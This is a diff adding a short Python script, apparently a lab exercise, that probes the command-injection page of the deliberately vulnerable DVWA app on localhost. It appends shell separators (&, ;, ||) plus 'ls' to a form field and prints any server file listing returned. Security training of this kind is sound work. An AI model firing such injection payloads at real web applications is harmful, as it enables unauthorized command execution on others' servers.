@@ -1,0 +1,23 @@
+# Importing Modules
+import requests
+import re
+# Trying different query symbols (AND,SEMI-COLON,OR)
+commands = ['&',';','||']
+URL = "http://127.0.0.1/DVWA/vulnerabilities/exec/"
+cookie = {"PHPSESSID":"9tp4hi0m7muokdfi94sk31ji4f","security":"low"}
+# Creating the session
+session = requests.Session()
+for command in commands:
+ # ls = List command
+ data = {"ip":command+"ls","Submit":"Submit"}
+ # Accessing the session opened on browser using the same cookie
+ request = session.post(URL, cookies=cookie, data=data)
+ # Get only the pre-formatted text from server response i.e the server files
+ response = re.search(r'<pre>(?P<file>.*)</pre>',request.text,re.DOTALL)
+ serverFiles = response.group("file") # Add the file to a group
+ if len(serverFiles) > 1:
+ print(command, "works on this site!")
+ print("**Server Files and Folders**")
+ print(serverFiles,"\n")
+ else:
+ print("Does not work")
